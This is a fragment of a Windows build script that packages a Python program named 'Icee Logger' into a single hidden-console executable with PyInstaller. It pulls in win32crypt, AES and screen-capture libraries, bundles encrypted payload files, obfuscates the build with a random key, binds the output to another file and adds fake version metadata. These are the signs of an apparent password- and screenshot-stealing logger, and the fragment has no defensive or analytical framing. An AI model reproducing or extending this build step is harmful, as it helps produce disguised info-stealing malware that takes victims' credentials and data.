...
pyinstaller --onefile --noconsole --noconfirm main-o.py --name "Icee Logger" -i %icon% --clean --hidden-import requests --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --hidden-import urllib3 --add-data cm.bam.aes;. --add-data a.es;. --add-data config.json;. --add-data ck.bam.aes;. --add-data pm.bam.aes;. --key %random%%random%%random%5 --version-file version.txt %bound%
cls
